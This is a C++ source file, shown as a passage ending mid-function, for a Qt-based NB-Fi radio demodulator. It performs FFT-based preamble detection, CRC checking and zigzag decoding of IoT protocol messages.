#include "NBFi_demodulator.h"
#include <math.h>
#include <QFile>
#include <QDebug>
#include <QEventLoop>
#include <QTimer>



uint NBFiDemodulator::batch_id_counter = 0;

NBFiDemodulator::NBFiDemodulator()
{
    //logpath = lp;
    inprogr = 0;
    processing = 0;
    zero_to_delete = 0;
    batch_id = 0;
    record_to_file = 0;
    i_q_reverse = 0;
    sym_rate = DEFAULT_SYM_RATE;
	tables_num = DEFAULT_TABLE_NUM;
	rotates_num = DEFAULT_ROTATES_NUM;
	max_pre_errors = DEFAULT_MAX_PRE_ERRORS;
	max_pre_calc = DEFAULT_MAX_PRE_CALC;
	max_pre_calc_1_3 = DEFAULT_MAX_PRE_CALC_1_3;
    fft_size = (SAMPLE_FREQ/BAND_DIVIDER/sym_rate);

    //window = wft::build();
#ifdef DEFAULT_DECODE_1_2
	decode_1_2 = true;
#else 
	decode_1_2 = false;
#endif
#ifdef DEFAULT_DECODE_1_3
	decode_1_3 = true;
#else 
	decode_1_3 = false;
#endif

#ifdef DEFAULT_PROT_C
    decode_prot_c = true;
#else
    decode_prot_c = false;
#endif

#ifdef DEFAULT_PROT_D
    decode_prot_d = true;
#else
    decode_prot_d = false;
#endif



#ifdef FFTW
    fft_in = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * FFT_SIZE);
    fft_out = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * FFT_SIZE);
    fft_plan = fftwf_plan_dft_1d(FFT_SIZE, fft_in, fft_out, FFTW_FORWARD, FFTW_MEASURE);
#endif

#ifdef GPUFFT

    //mb = mbox_open();

    //gpu_fft_prepare(mb, (fft_size == 128)?8:log2(FFT_SIZE), GPU_FFT_REV, 1, &gfft);

#endif

}




void NBFiDemodulator::setSymRate(uint sr)
{
    sym_rate = sr;
    fft_size = (SAMPLE_FREQ/BAND_DIVIDER/sym_rate);
#ifdef GPUFFT
    mb = mbox_open();
    gpu_fft_prepare(mb, (fft_size == 128)?8:log2(FFT_SIZE), GPU_FFT_REV, 1, &gfft);

#endif
}

bool NBFiDemodulator::getNextChart(fft_chart *chart)
{

    if(charts.isEmpty()) {return false;}

    fft_chart *tmp = charts.dequeue();

    chart->resize(tmp->getlen());

    for(long i = 0; i < tmp->getlen(); i++)
    {
        chart->getdata()[i] = tmp->getdata()[i];
    }
    chart->setTime(tmp->time());
    delete tmp;
    return true;

}

unsigned int NBFiDemodulator::num_of_bits32(unsigned int n)
{
	n -= (n >> 1) & 0x55555555;
	n = ((n >> 2) & 0x33333333) + (n & 0x33333333);
	n = ((((n >> 4) + n) & 0x0F0F0F0F) * 0x01010101) >> 24;
	return n; // ????? ?????????? ??????? ????????? ?? 8 ??????? ?????.
}

unsigned int NBFiDemodulator::num_of_bits64(unsigned long long n)
{
    unsigned int a = *((int*)&n);
    unsigned int b = *((int*)&n + 1);
    return num_of_bits32(a) + num_of_bits32(b);
}

void NBFiDemodulator::save_to_file()
{

    QFile outFile;

    outFile.setFileName("data_250kHz.txt");
    if(!outFile.open(QIODevice::WriteOnly)) return;

    float *mas = new float[raw_data_len/BAND_DIVIDER*2];

    for(int i = 0; i < raw_data_len/BAND_DIVIDER; i++)
    {
        mas[2*i] = zeroF_I_Q[i][0];
        mas[2*i+1] = zeroF_I_Q[i][1];
    }

    outFile.write((const char*)(&mas[0]),raw_data_len/BAND_DIVIDER*2*4);

    outFile.close();

    delete[] mas;
}


void NBFiDemodulator::run()
{
    inprogr = 1;
	should_end = 0;
   // save_to_file();

    QList<message_point*>::iterator i;

    //qDebug() << dem_id << " Entering to run()	" << processing_timer.msecsTo(QDateTime::currentDateTime()) << "msec";
	processing_timer = QDateTime::currentDateTime();
	 

    for(i = m_list.begin(); i != m_list.end(); i++) delete (*i);

    m_list.clear();

    for(int r = 0; r < rotates_num; r++)
    {
        if (should_end) break;
        //qDebug() << dem_id << " Rotation# " << r;
        Rotation = r;
        rotateI_Q(r);
        build_fft_tables();
        //qDebug() << dem_id << " Tables builded" <<"	" << processing_timer.msecsTo(QDateTime::currentDateTime()) << "msec";
	    processing_timer = QDateTime::currentDateTime();
	
        QList<preamble_point*>::iterator p;
        for(p = p_list.begin(); p!= p_list.end(); p++) delete (*p);
        p_list.clear();
        find_preambles();
        //if (p_list.count())
            //qDebug() << dem_id << " Preambles found: " << p_list.count() << "  msec	" << processing_timer.msecsTo(QDateTime::currentDateTime()) << "msec";
	    processing_timer = QDateTime::currentDateTime();
        decode_messages();
        //if (p_list.count())
            //qDebug() << dem_id << " Mesages decoded:" << m_list.count() << "	" << processing_timer.msecsTo(QDateTime::currentDateTime()) << "msec";
        //for (int i=0; i < m_list.count(); i++)
        if (m_list.count()) {
            float max = m_list[0]->RSSI;
            for (int i=0; i<m_list.count(); i++) {
                if (m_list[i]->RSSI > max)
                    max = m_list[i]->RSSI;
            }

            float snr = m_list[0]->SNR;
            float rssi;
            float noise;
            float iqad;
            float ftmp[128*2];

            for (int g=0; g<m_list.count(); g++) {

                for (int i=0; i<128; i++) {
                    ftmp[i*2] = m_list[g]->rawData[i*2] * m_list[g]->rawData[(i+1) * 2];
                    ftmp[i*2 + 1] = m_list[g]->rawData[i*2 + 1] * m_list[g]->rawData[(i+1) * 2 + 1];
                }


                //usleep(100000);

                if (m_list[g]->SNR > -2 && m_list[g]->SNR < 30)
                    std::cout << " NB-Fi data! SNR: " << m_list[g]->SNR << ", RSSI: " << m_list[g]->RSSI << ", NOISE: " << m_list[g]->NOISE << ", iqAvgDiv: "  << m_list[g]->IQDIV << std::endl;

                if (m_list[g]->SNR > snr && m_list[g]->SNR < 30) {
                    snr = m_list[g]->SNR;
                    rssi = m_list[g]->RSSI;
                    noise = m_list[g]->NOISE;
                    iqad = m_list[g]->IQDIV;
                }

                //if ((rssi - noise) > 0 && (rssi - noise) < 40)
                    UDP_Clients::udp1234->send((char*)ftmp, 64 * 8);
            }

            //std::cout << " NB-Fi data! SNR: " << snr << ", RSSI: " << rssi << ", NOISE: " << noise << ", iqAvgDiv: "  << iqad << std::endl;
            //qDebug() << " NB-Fi MSG!" << m_list[0]->getPayload();
        }
        processing_timer = QDateTime::currentDateTime();
        calc_messages(m_list);
    }
    processing = 0;
    filtered_list.clear();
    filter_messages(m_list, filtered_list);
    if (p_list.count()) {
    //    qDebug() << dem_id << " Mesages filtered:" << filtered_list.count() << "	" << processing_timer.msecsTo(QDateTime::currentDateTime()) << "msec";
        processing_timer = QDateTime::currentDateTime();

        msgcount += filtered_list.count();
    }


    //qDebug() << dem_id << "  Total batch calculation time:" << QString::number(run_start.msecsTo(QDateTime::currentDateTime())/1000.0, 'q', 2) << "sec\n";

    inprogr = 0;
    //clear_all();
    emit messages_ready(this);
}

void NBFiDemodulator::clear_all()
{
    //qDebug() << dem_id << "  Clear all.\n";
    for(uint32_t t = 0; t < tables_num; t++)
    {
	//qDebug() << "t =" << t << tables_num;
#ifdef FFTW
        fftwf_free(fft_table[t]);
        fftwf_free(corr_table[t]);
#else	    
	delete fft_table[t];
	delete corr_table[t];
#endif
    }
#ifdef FFTW
    fftwf_free(zeroF_I_Q);
    fftwf_free(zeroF_I_Q_rot);
#else	
    delete zeroF_I_Q;	
    if (rotates_num != 1) 
        delete zeroF_I_Q_rot;
#endif


    inprogr = 0;
    //if(zero_to_delete) {zero_to_delete=0; fftwf_free(zeroF_I_Q);}
}

void NBFiDemodulator::rotateI_Q(uint rot)
{

    float dPhi = (((float)sym_rate)/rotates_num*rot/(SAMPLE_FREQ/BAND_DIVIDER));
    EllipticSinGenerator elGen(dPhi);
    for(long i = 0; i < (symb_over_len)*FFT_SIZE; i++)
    {
        if(rot)
        {
            elGen.generate();
            float curSin = elGen.getSin();
            float curCos = elGen.getCos();

            zeroF_I_Q_rot[i][0] = curCos*zeroF_I_Q[i][0] + curSin*zeroF_I_Q[i][1];
            zeroF_I_Q_rot[i][1] = curCos*zeroF_I_Q[i][1] - curSin*zeroF_I_Q[i][0];
        }
        else
        {
	      
	      //  zeroF_I_Q_rot[i][0] = zeroF_I_Q[i][0];
	      //  zeroF_I_Q_rot[i][1] = zeroF_I_Q[i][1];
        }
    }

}

void NBFiDemodulator::build_fft_tables()
{

#ifdef GENERATE_FFT_CHARTS
    float chart[FFT_SIZE];
#endif
		memset(noise_lev, 0, sizeof(noise_lev));
		memset(noise_lev_min, 0, sizeof(noise_lev_min));


        for(int t = 0; t < tables_num; t++)
        {

            unsigned int aver_count = 0;
            int table = t;
            if(Rotation == 0)
            {
#ifdef FFTW
                fft_table[table] = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * (symb_over_len+5)*FFT_SIZE);
                corr_table[table] = (fftwf_complex*) fftwf_malloc(sizeof(fftwf_complex) * (symb_over_len+5)*FFT_SIZE);
#else	            
                fft_table[table] = new fftwf_complex[(symb_over_len + 5)*FFT_SIZE];
                corr_table[table] = new fftwf_complex[(symb_over_len + 5)*FFT_SIZE];

#endif
            }
            int sym_offset = t * FFT_SIZE / tables_num;

            for(long i = sym_offset; i < (symb_over_len-1)*FFT_SIZE + sym_offset; i += FFT_SIZE)
            {
                for(long k = 0; k < FFT_SIZE; k++)
                {
					#ifdef FFTW
                        if (Rotation == 0)
                        {
                            fft_in[k][0] = zeroF_I_Q[i+k][0];
                            fft_in[k][1] = zeroF_I_Q[i+k][1];
                        }
                        else
                        {
                            fft_in[k][0] = zeroF_I_Q_rot[i+k][0];
                            fft_in[k][1] = zeroF_I_Q_rot[i+k][1];
                        }
					#endif
					#ifdef GPUFFT
	                if (Rotation == 0)
	                {


                            if(fft_size != 128)
                            {                              
                                gfft->in[k].re = zeroF_I_Q[i + k][1];
                                gfft->in[k].im = zeroF_I_Q[i + k][0];
                            }
                            else
                            {
                                gfft->in[k*2 + 1].re = gfft->in[k*2].re = zeroF_I_Q[i + k][1];
                                gfft->in[k*2 + 1].im = gfft->in[k*2].im = zeroF_I_Q[i + k][0];
                                // = zeroF_I_Q[i + k][1];
                                // = zeroF_I_Q[i + k][0];

                            }

	                }
	                else
	                {

                            if(fft_size != 128)
                            {
                                gfft->in[k].re = zeroF_I_Q_rot[i + k][1];
                                gfft->in[k].im = zeroF_I_Q_rot[i + k][0];
                            }
                            else
                            {
                                gfft->in[k*2 + 1].re = gfft->in[k*2].re = zeroF_I_Q_rot[i + k][1];
                                gfft->in[k*2 + 1].im = gfft->in[k*2].im = zeroF_I_Q_rot[i + k][0];
                            }


	                }
	                #endif
                }
				#ifdef FFTW


                fftwf_execute(fft_plan);
				#endif
				
				#ifdef GPUFFT
                m_mutex->lock();
	            gpu_fft_execute(gfft);
                m_mutex->unlock();
                #endif
	            
                for(long j = 0; j < FFT_SIZE; j++)
                {
					#ifdef FFTW
                    fft_table[table][i-sym_offset+j][0] = fft_out[j][0];
                    fft_table[table][i-sym_offset+j][1] = fft_out[j][1];
					#endif					
					#ifdef GPUFFT

                    if(fft_size != 128)
                    {

                        fft_table[table][i - sym_offset + j][0] = gfft->out[j].re;
                        fft_table[table][i - sym_offset + j][1] = gfft->out[j].im;

                    }
                    else
                    {
                        if(j < 64)
                        {
                            fft_table[table][i - sym_offset + j][0] = gfft->out[j].re;
                            fft_table[table][i - sym_offset + j][1] = gfft->out[j].im;
                        }
                        else
                        {
                            fft_table[table][i - sym_offset + j][0] = gfft->out[j+128].re;
                            fft_table[table][i - sym_offset + j][1] = gfft->out[j+128].im;

                        }

                    }
                    #endif
                }

                for(int j = 0; j < FFT_SIZE; j++)
                {
					#ifdef FFTW
                    noise_lev[table][j] += fft_out[j][0]*fft_out[j][0] + fft_out[j][1]*fft_out[j][1];
					#endif
					#ifdef GPUFFT	                
					float re, im;
                    re = gfft->out[j].re;
                    im = gfft->out[j].im;
                    //re = gfft->out[j*2].re;
                    //im = gfft->out[j*2].im;

                    noise_lev[table][j] += re*re + im*im;

                    /*if(fft_size == 128)
                    {
                        *this << QString::number(10*log10(re*re + im*im) - 218) + "\n";
                        re = gfft->out[j+128].re;
                        im = gfft->out[j+128].im;
                        *this << QString::number(10*log10(re*re + im*im) - 218) + "\n";
                    }*/
                    #endif
					if((aver_count == NOISE_AVER_NUM*FFT_SIZE))
                    {
                        if(j == FFT_SIZE - 1) aver_count = 0;
                        if((noise_lev[table][j] < noise_lev_min[table][j])||(noise_lev_min[table][j] == 0)) noise_lev_min[table][j] = noise_lev[table][j];
                        noise_lev[table][j] = 0;
                    }
                    else aver_count++;

                }
				#ifdef GENERATE_FFT_CHARTS
                if((table == 0)&&(Rotation == 0)&&!((i/FFT_SIZE)%FFT_DRAW_CYCLE))
                {
                    for(int j = 0; j < FFT_SIZE; j++)
                    {
                        //chart[j] = 10*log10(noise_lev_min[t][j]/NOISE_AVER_NUM);
						#ifdef FFTW
                        if(j<=FFT_SIZE/2) chart[FFT_SIZE/2-j]= 10*log10(fft_out[j][0]*fft_out[j][0] + fft_out[j][1]*fft_out[j][1]);
                        else chart[FFT_SIZE/2+(FFT_SIZE-j)]= 10*log10(fft_out[j][0]*fft_out[j][0] + fft_out[j][1]*fft_out[j][1]);
						#endif
                    }
                    fft_chart *ch = new fft_chart(FFT_SIZE);
                    ch->setdata(chart);
                    ch->setTime(start_time.addMSecs((i/FFT_SIZE)*1000/sym_rate));
                    charts.enqueue(ch);
                }
				#endif
            }
        }
//    }
}

void NBFiDemodulator::find_preambles()
{
  fftwf_complex correlation;

  for (int i = 0; i <= max_pre_errors; i++) pre_found_num_for_each_error[i] = 0;


  //UDP_Clients::udp1235->send((char*)fft_table[1], 8*1024);

  for(int t = 0; t < tables_num; t++)
  {

    for(int x_coord = 0; x_coord < FFT_SIZE; x_coord++)
    {

        //if ((x_coord < FFT_SIZE/24) && (x_coord > FFT_SIZE - FFT_SIZE/24)) continue;

        //if ((x_coord > 504) && (x_coord < FFT_SIZE - 504)) continue;

        float i1=0, q1=0;
        float i2=0, q2=0;
        long x_m = x_coord*(symb_over_len);
        uint64_t corr = 0;
        uint64_t inv_corr = 0;


        for(int y_coord = 0; y_coord < symb_over_len; y_coord++)
        {
            if (should_end) return;
            long y_m = y_coord*FFT_SIZE;
            i2 = fft_table[t][x_coord+y_m][0];
            q2 = fft_table[t][x_coord+y_m][1];

            correlation[0] = i1*i2+q1*q2;
            correlation[1] = -i1*q2+q1*i2;

            corr_table[t][x_m + y_coord][0] = correlation[0];
            corr_table[t][x_m + y_coord][1] = correlation[1];

            i1 = i2;
            q1 = q2;

            if(y_coord > symb_over_len - MESSAGE_C_MAXLEN) continue;

            corr = (corr << 1)+ (correlation[0]>0);
            inv_corr = (inv_corr << 1)+ (correlation[1]>0);

	        uint err_n;

            if ((err_n = num_of_bits(corr ^ PREAMBLE_C)) <= max_pre_errors)
            {
                preamble_point *pre = new preamble_point(x_coord,y_coord-7, t, 0, 0, err_n);
	            pre_found_num_for_each_error[err_n]++;
                p_list.append(pre);
            }

            if((err_n = num_of_bits(corr^INVPREAMBLE_C)) <= max_pre_errors)
            {
	            preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 0, 1, err_n);
	            pre_found_num_for_each_error[err_n]++;
				p_list.append(pre);
                //qDebug() << " <<< preamble " << corr << "\n";
            }

            if((err_n = num_of_bits(inv_corr^PREAMBLE_C)) <= max_pre_errors)
            {
	            preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 1, 0, err_n);
	            pre_found_num_for_each_error[err_n]++;
				p_list.append(pre);
            }

            if((err_n = num_of_bits(inv_corr^INVPREAMBLE_C)) <= max_pre_errors)
            {
	            preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 1, 1, err_n);
	            pre_found_num_for_each_error[err_n]++;
				p_list.append(pre);
                //qDebug() << " <<< preamble " << corr << "\n";
            }

        }
    }
  }

}

unsigned int NBFiDemodulator::find_preambles_near(unsigned int x_c, unsigned int y_c)
{

	//return 0;
    fftwf_complex correlation;
 //   unsigned int pre_found = 0;

	near_p_list.clear();

	uint err_mas[max_pre_errors + 2];

	for (int i = 0; i <= max_pre_errors + 2; i++) err_mas[i] = 0;

    for(int t = 0; t < tables_num; t++)
    {

      for(unsigned int x_coord = x_c - 2; x_coord < x_c + 2; x_coord++)
      {

          long x_m = x_coord*(symb_over_len);
          unsigned int corr = 0;
          unsigned int inv_corr = 0;

          for(unsigned int y_coord = y_c - 24 - 9; y_coord < y_c - 24  + 32 + 9; y_coord++)
          {

              correlation[0] = corr_table[t][x_m + y_coord][0];
              correlation[1] = corr_table[t][x_m + y_coord][1];


              corr = (corr << 1)+ (correlation[0]>0);
              inv_corr = (inv_corr << 1)+ (correlation[1]>0);

	          uint err_n;

	          if ((err_n = num_of_bits32(corr ^ PREAMBLE_C)) <= max_pre_errors + 1)
              {
                  preamble_point *pre = new preamble_point(x_coord,y_coord-7, t, 0, 0, err_n);
	              err_mas[err_n]++; 
				  near_p_list.append(pre);
                  //pre_found++;
              }
	          if ((err_n = num_of_bits32(corr ^ INVPREAMBLE_C))  <= max_pre_errors + 1)
              {
	              preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 0, 1, err_n);
                  near_p_list.append(pre);
	              err_mas[err_n]++;
				  //pre_found++;
              }
	          if ((err_n = num_of_bits32(inv_corr ^ PREAMBLE_C))  <= max_pre_errors + 1)
              {
	              preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 1, 0, err_n);
                  near_p_list.append(pre);
	              err_mas[err_n]++;
				  //pre_found++;
              }
	          if ((err_n = num_of_bits32(inv_corr ^ INVPREAMBLE_C)) <= max_pre_errors + 1)
              {
	              preamble_point *pre = new preamble_point(x_coord, y_coord - 7, t, 1, 1, err_n);
                  near_p_list.append(pre);
	              err_mas[err_n]++;
				  //pre_found++;
              }
          }
      }
    }


	uint err_sumary = 0;
	int err_last_level = -1;
	uint err_last_level_num;

	for (int i = 0; i <= max_pre_errors + 1; i++) 
	{
		if (err_mas[i] >= max_pre_calc_1_3 - err_sumary)
		{
			if (err_last_level == -1) 
			{
				err_last_level = i;
				err_last_level_num = max_pre_calc_1_3 - err_sumary;
			}
			err_mas[i] = max_pre_calc_1_3 - err_sumary;
			err_sumary = max_pre_calc_1_3;
		}
		else err_sumary += err_mas[i];
		
	}

	if (err_last_level != -1)
	{
		
		QList<preamble_point*>::iterator i;

		for (i = near_p_list.begin(); i != near_p_list.end(); i++)
		{
		
			int err = (*i)->err_num;
			if (err > err_last_level) 
			{	
				(*i)->err_num = -1;	
				continue;
			}
			if (err == err_last_level) 
			{
				if (err_last_level_num == 0) {(*i)->err_num = -1; continue;}
				err_last_level_num--;
			}
	
		}
	}
    return near_p_list.count();
}

void NBFiDemodulator::decode_messages()
{
    QList<preamble_point*>::iterator i;


    float d_in[500];
    float *d_in_d;
    float tmp_corr;
    //float d_out_soft[128];
    int d_out[128];
    message_point* mes = new message_point();

    for (int i = 0; i < sizeof(PREAMBLE_C) - 1; i++)
        mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;

    /*
    mes->packet[0] = 0x91;
    mes->packet[1] = 0x1a;
    mes->packet[2] = 0xc4;
    mes->packet[3] = 0x8f;
    mes->packet[4] = 0x11;
    mes->packet[5] = 0x11;
    mes->packet[6] = 0x11;
*/
	uint err_sumary = 0;
	int err_last_level = -1;
	uint err_last_level_num;

    //qDebug() << dem_id << "Stage 1";
	for (int i = 0; i <= max_pre_errors; i++) 
    {
		if (pre_found_num_for_each_error[i] >= max_pre_calc - err_sumary)
		{
			if (err_last_level == -1) 
			{
				err_last_level = i;
				err_last_level_num = max_pre_calc - err_sumary;
			}
			pre_found_num_for_each_error[i] = max_pre_calc - err_sumary;
			err_sumary = max_pre_calc;
			break;
		}
		else err_sumary += pre_found_num_for_each_error[i];
		
	}
    //qDebug() << dem_id <<  "Stage 2";
    for(i = p_list.begin(); i!= p_list.end(); i++)
    {

        unsigned int x_c = (*i)->x_coord;
        unsigned int y_c = (*i)->y_coord;
        unsigned int t = (*i)->table_no;
        unsigned int p_sng = (*i)->pre_sign;
        unsigned int c_sng = (*i)->corr_sign;

        unsigned int point = x_c*(symb_over_len) + y_c;
 //       unsigned int fft_point = x_c+y_c*FFT_SIZE;
        unsigned int crc = 0, crc_d = 0;
        unsigned int bit_ptr = 0;
        //float rssi = 0;
        //float fft_i, fft_q;

        //for(int byte = 3; byte < MESSAGE_D_MAXLEN_W_O_ZIGZAG + 15; byte++)
        float iAvg = 0.0, qAvg = 0.0;

        for(int byte = sizeof(PREAMBLE_C) - 1; byte < MESSAGE_D_MAXLEN_W_O_ZIGZAG; byte++)
        {
            unsigned char data = 0;
            for(int bit = 0; bit < 8; bit++)
            {

                if(!c_sng)
                {
                    tmp_corr = corr_table[t][point][0];
                    data = (data << 1) + (tmp_corr > 0);
                }
                else
                {
                    tmp_corr = corr_table[t][point][1];
                    data = (data << 1) + (tmp_corr > 0);

                }

                if(!p_sng) d_in[bit_ptr] = -tmp_corr;
                else d_in[bit_ptr] = tmp_corr;

                bit_ptr++;
                point++;

                iAvg += std::fabs(corr_table[t][point][0]);
                qAvg += std::fabs(corr_table[t][point][1]);

            }
            if(p_sng)
            {
                data = ~data;
            }

            mes->packet[byte] = data;

            if((byte >= MESSAGE_C_MAXLEN_W_O_ZIGZAG -4) && (byte < MESSAGE_C_MAXLEN_W_O_ZIGZAG))
            //if((byte >= 23 - 4) && (byte < 23))
            {
                crc = (crc << 8) + data;
            }

            if(byte >= MESSAGE_D_MAXLEN_W_O_ZIGZAG - 3)
            //if(byte >= 24 - 3)
            {
                crc_d = (crc_d << 8) + data;
            }

        }
/*
        QString s = "";
        for (int rer = 0; rer < 35; rer++) {
            s += QString::number(mes->packet[rer], 16);
            //s += (int)mes->packet[rer];
            s += " ";
        }

        qDebug() << dem_id << " " << s;
*/
        unsigned int calc_crc;
        if(decode_prot_c) calc_crc = digital_crc32(&mes->packet[3], 8+4);

        if(decode_prot_c &&(crc == calc_crc))
        {
            int c = sizeof(PREAMBLE_C) - 1;
            //mes->FREQ = x_c; //convert to Hz later
            mes->TYPE = MESSAGE_C;
            mes->batch_time = y_c;
            mes->demod_method = DEMOD_CRC;
           // mes->RSSI = (*i)->RSSI = rssi;//10*log10(rssi);
            mes->ID = (mes->packet[c++]<<16) + (mes->packet[c++]<<8) + mes->packet[c++];
            mes->FLAGS = mes->packet[c++];
            for(int j = 0; j < 8; j++) mes->PAYLOAD[j] = mes->packet[c+j];
            mes->P_CRC = crc;
            mes->preamble = (*i);
            mes->err_num = (*i)->err_num;
            mes->IQDIV = 20 * std::log10(iAvg/qAvg);
            m_list.append(mes);
            //p_list.erase(i);
            mes = new message_point();
            memcpy(mes->rawData, corr_table[t][x_c*(symb_over_len) + y_c], 128 * sizeof(float)*2);
            for (int i = 0; i < sizeof(PREAMBLE_C) - 1; i++)
                mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;
            /*
            mes->packet[0] = 0x91;
            mes->packet[1] = 0x1a;
            mes->packet[2] = 0xc4;
            mes->packet[3] = 0x8f;
            mes->packet[4] = 0x11;
            mes->packet[5] = 0x11;
            mes->packet[6] = 0x11;
            */
        }
        else
        {

            if(decode_prot_d)  calc_crc = digital_crc32(&mes->packet[4], 8 + 4 + 1);

            if(decode_prot_d && (crc_d == (calc_crc & 0xffffff)))
            {
                int c = sizeof(PREAMBLE_C);
                mes->TYPE = MESSAGE_D;
                mes->batch_time = y_c;
                mes->demod_method = DEMOD_CRC;
                mes->ID = (mes->packet[c++]<<16) + (mes->packet[c++]<<8) + mes->packet[c++];
                mes->FLAGS = mes->packet[c++];
                for(int j = 0; j < 8; j++) mes->PAYLOAD[j] = mes->packet[c+j];
                mes->P_CRC = crc_d;
                mes->CRC8_D = mes->packet[c+8];
                mes->preamble = (*i);
                mes->err_num = (*i)->err_num;
                mes->IQDIV = 20 * std::log10(iAvg/qAvg);
                memcpy(mes->rawData, corr_table[t][x_c*(symb_over_len) + y_c], 128 * sizeof(float)*2);
                m_list.append(mes);
                //p_list.erase(i);
                mes = new message_point();
                for (int i = 0; i < sizeof(PREAMBLE_C); i++)
                    mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;

                /*
                mes->packet[0] = 0x91;
                mes->packet[1] = 0x1a;
                mes->packet[2] = 0xc4;
                mes->packet[3] = 0x8f;
                mes->packet[4] = 0x11;
                mes->packet[5] = 0x11;
                mes->packet[6] = 0x11;
                mes->packet[7] = 0x11;
                */
            }
            else
            {

	        if(!decode_1_2) continue;

            if (should_end) continue;

            if (err_last_level != -1)
            {
                int err = (*i)->err_num;
                if (err > err_last_level) continue;
                if (err == err_last_level)
                {
                    if (err_last_level_num == 0) continue;
                    err_last_level_num--;
                }
            }


            if(decode_prot_d)
            {
                d_in_d = &d_in[8];

                for(int z = 128; z < 128+64; z++)
                {

                    if(!c_sng)
                    {
                        tmp_corr = corr_table[t][point][0];
                    }
                    else
                    {
                        tmp_corr = corr_table[t][point][1];
                    }

                    if(!p_sng) tmp_corr = -tmp_corr;

                    unsigned int par = ((z&1) == 1);

                    if(x_c < FFT_SIZE/2)
                    {
                        if(par) {d_in_d[z] = tmp_corr; d_in_d[z+64] = 0;}
                        else {d_in_d[z+64] = tmp_corr; d_in_d[z] = 0;}
                    }
                    else
                    {
                        if(par) {d_in_d[64+z] = tmp_corr; d_in_d[z] = 0;}
                        else {d_in_d[z] = tmp_corr; d_in_d[64+z] = 0;}

                    }
                    point++;

                }

                for(int z = 192; z < 192+64; z++)
                {

                    if(!c_sng)
                    {

                        tmp_corr = corr_table[t][point][0];
                    }
                    else
                    {

                        tmp_corr = corr_table[t][point][1];

                    }

                    if(!p_sng) tmp_corr = -tmp_corr;

                    int par = ((z&1) == 1);

                    if(x_c < FFT_SIZE/2)
                    {
                        if(par) {d_in_d[64+z] = tmp_corr; d_in_d[128+z] = 0;}
                        else {d_in_d[128+z] = tmp_corr; d_in_d[64+z] = 0;}
                    }
                    else
                    {
                        if(par) {d_in_d[128+z] = tmp_corr; d_in_d[64+z] = 0;}
                        else {d_in_d[64+z] = tmp_corr; d_in_d[128+z] = 0;}

                    }
                    point++;

                }
                zigzag_decoder_soft_var_len(d_in_d, d_out/*, d_out_soft/*, mas_for_zigzag*/);

                bit_ptr = 0;
                crc = 0;
                int byte;
                for(byte = sizeof(PREAMBLE_C); byte < MESSAGE_D_MAXLEN_W_O_ZIGZAG; byte++)
                {
                    unsigned char data = 0;
                    for(int bit = 0; bit < 8; bit++)
                    {
                        data = (data << 1) + (d_out[bit_ptr++]!=0);
                    }

                    mes->packet[byte] = data;

                    if(byte >= MESSAGE_D_MAXLEN_W_O_ZIGZAG - 3)
                    {
                        crc = (crc << 8) + data;
                    }
                }
                calc_crc = digital_crc32(&mes->packet[4], 8 + 4 + 1);
            }
            if(decode_prot_d && (crc == (calc_crc & 0xffffff)))
            {
                int c = sizeof(PREAMBLE_C);
                mes->TYPE = MESSAGE_D;
                mes->batch_time = y_c;
                mes->demod_method = DEMOD_1_2;
                mes->ID = (mes->packet[c++]<<16) + (mes->packet[c++]<<8) + mes->packet[c++];
                mes->FLAGS = mes->packet[c++];
                for(int j = 0; j < 8; j++) mes->PAYLOAD[j] = mes->packet[c+j];
                mes->P_CRC = crc;
                mes->CRC8_D = mes->packet[c+12];
                mes->preamble = (*i);
                mes->err_num = (*i)->err_num;
                mes->IQDIV = 20 * std::log10(iAvg/qAvg);
                memcpy(mes->rawData, corr_table[t][x_c*(symb_over_len) + y_c], 128 * sizeof(float)*2);
                m_list.append(mes);
                mes = new message_point();
                for (int i = 0; i < sizeof(PREAMBLE_C) - 1; i++)
                    mes->packet[i] = PREAMBLE_C >> (8*(sizeof(PREAMBLE_C) - 1 - i)) & 0xff;
                /*
                mes->packet[0] = 0x91;
                mes->packet[1] = 0x1a;
                mes->packet[2] = 0xc4;
                mes->packet[3] = 0x8f;
                mes->packet[4] = 0x11;
                mes->packet[5] = 0x11;
                mes->packet[6] = 0x11;
*/
            }
            else
            {
                if(decode_prot_c)
                {
                    point = x_c*(symb_over_len) + y_c + 8 * 16;

                    for(int z = 128; z < 128+64; z++)
                    {

                        if(!c_sng)
                        {
                            tmp_corr = corr_table[t][point][0];
                        }
                        else
                        {
                            tmp_corr = corr_table[t][point][1];
                        }

                        if(!p_sng) tmp_corr = -tmp_corr;

                        unsigned int par = ((z&1) == 1);

                        if(x_c < FFT_SIZE/2)
                        {
                            if(par) {d_in[z] = tmp_corr; d_in[z+64] = 0;}
                            else {d_in[z+64] = tmp_corr; d_in[z] = 0;}
                        }
                        else
                        {
                            if(par) {d_in[64+z] = tmp_corr; d_in[z] = 0;}
                            else {d_in[z] = tmp_corr; d_in[64+z] = 0;}

                        }
                        point++;

                    }

                    for(int z = 192; z < 192+64; z++)
                    {

                        if(!c_sng)
                        {

                            tmp_corr = corr_table[t][point][0];
                        }
                        else
                        {

                            tmp_corr = corr_table[t][point][1];

                        }

                        if(!p_sng) tmp_corr = -tmp_corr;

                        int par = ((z&1) == 1);

                        if(x_c < FFT_SIZE/2)
                        {
                            if(par) {d_in[64+z] = tmp_corr; d_in[128+z] = 0;}
                            else {d_in[128+z] = tmp_corr; d_in[64+z] = 0;}
                        }
                        else
                        {
                            if(par) {d_in[128+z] = tmp_corr; d_in[64+z] = 0;}
                            else {d_in[64+z] = tmp_corr; d_in[128+z] = 0;}

                        }
                        point++;

                    }
                    zigzag_decoder_soft_var_len(d_in, d_out/*, d_out_soft, mas_for_zigzag*/);

                    bit_ptr = 0;
                    crc = 0;
                    int byte;
                    for(byte = 3; byte < MESSAGE_C_MAXLEN_W_O_ZIGZAG; byte++)
                    {
                        unsigned char data = 0;
                        for(int bit = 0; bit < 8; bit++)
                        {
